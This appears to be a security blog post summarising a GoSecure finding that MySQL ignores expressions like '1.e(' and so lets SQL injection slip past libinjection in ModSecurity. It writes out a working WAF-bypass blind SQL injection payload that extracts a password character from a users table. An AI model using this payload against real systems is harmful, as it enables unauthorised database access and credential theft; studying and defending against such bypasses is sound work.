---
title: "Bypassing ModSecurity WAF"
date: 2025-01-22
categories: 
  - "cybersecurity"
  - "cybersecurity-awareness"
  - "firewall"
  - "forensics"
  - "security"
  - "security-awareness"
  - "security-awareness-3-0"
tags: 
  - "libinjection"
  - "modsecurity"
  - "mysql"
  - "waf"
---

Being able to bypass Web Application Firewall (WAF) depends on your knowledge about their behavior. Here is a cool technique that involve **expressions that are ignored in MySQL SQL parser** (MySQL <= 5.7). This post summarizes the impact on libinjection. The libinjection library is used by WAF such as ModSecurity and SignalScience. For more details on AWS Cloudfront impact, read the original GoSecure article.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPVnidYg-zDcbocWT8PLVe-A3XzqWbXSUIOdIu3iFJMr5MSMm9yFg3hsyGDbuWrpqbgrpUj9XY2JyIdgNJv50IlUdIgeIHjNmBjqVYz8Vz8YO-e3toUt6Bd_Dwf9etJAumCHr8Mq89KQGT/s16000/s1bwt2caxl3q8m5d3rdc%255B1%255D.jpg)

## Scientific expression in MySQL

When MySQL sees `1.e(abc)`, it will ignore the `1.e(` portion because the following characters do not form a valid numeric value.

This behavior can be abused to fool libinjection tokenizer. Libinjection internally tokenizes the parameter and identifies contextual section types such as comments and strings. Libinjection sees the string “1.e” as an unknown SQL keyword and concludes that it is more likely to be an English sentence than code. When libinjection is unaware of an SQL function the same behavior can be exhibited.

## Attack in action

Here is a demonstration of modsecurity’s capability to block a malicious pattern for SQL injection. A forbidden page is returned which is the consequence of detection.

  

| ![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVGdql5mjxl-5Hwf2qo7rHAhpaTvHwVZ_bhOvkUPiTQDPA4L2TuQoa_YW6HLDHMLf6zuhQIfl-REEvbl2EUqvz_s2f_gqA2LqfsxMa3YM_tpbAEEMID-BZUVrmdHt0ai7sKHYNkhytbAqb/s16000/9ie8vtjdsmyrvge560hn%255B1%255D.gif) |
| --- |
| _Blocked!_ |

  

  

In the following image, you can see the original request being slightly modified to bypass modsecurity and libinjection.

  

| ![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfk6-njnB3IjPa5sQWIe7Lopmz4OS9YEn-7SDu4AIDuLqDSxA5Kj_JN7zYFiN3x8HQKUii6BPY6Ca7GhNmMd6ticMd_q9qIVoo5RGVR2ZqjQGTfJRTs926IK34iajdT1-HWlYI1nR68wUm/s16000/54colvp1kugv5i09mfzq%255B1%255D.gif) |
| --- |
| _WAF Bypass!_ |

  

  

### Complete payload

Now, how do we go beyond `or 1=1` payloads? The `NUMBER.e` expression can be inserted at plenty of locations without breaking the SQL query. The following payload demonstrated read on arbitrary SQL tables.  

```sql
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

The same payload was indented below for readability. `1.e(` and `1.e,` are ignored from the parser.  

```sql
1.e(ascii 
1.e(substring(
1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 #(first char = 70)
or'1'='2
```

## Conclusion

Most bypass techniques evolve using special encoding to obfuscate the malicious requests (URL encoding, Unicode multibytes, XML entities, etc). This technique will work if the system behind the WAF is doing an unexpected decoding. This new technique is not encoding related. For this reason, it will be a versatile trick until most system upgrade their MySQL instances.

_Full story on GoSecure blog (More details on AWS Cloudfront)_

Go to Source
